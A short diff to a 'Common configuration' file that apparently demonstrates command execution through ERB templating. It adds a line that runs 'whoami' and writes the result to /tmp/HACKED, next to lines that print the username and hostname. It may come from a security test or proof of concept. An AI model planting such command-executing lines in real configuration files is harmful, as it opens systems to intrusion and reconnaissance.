@@ -1,5 +1,7 @@
 # Common configuration.
 
+<%  `whoami > /tmp/HACKED` %>
+
 <%  $stdout.write "*********\n" %>
 <% `whoami && hostname`.lines.each do |path| %>
 <% $stdout.write path + "\n" %>
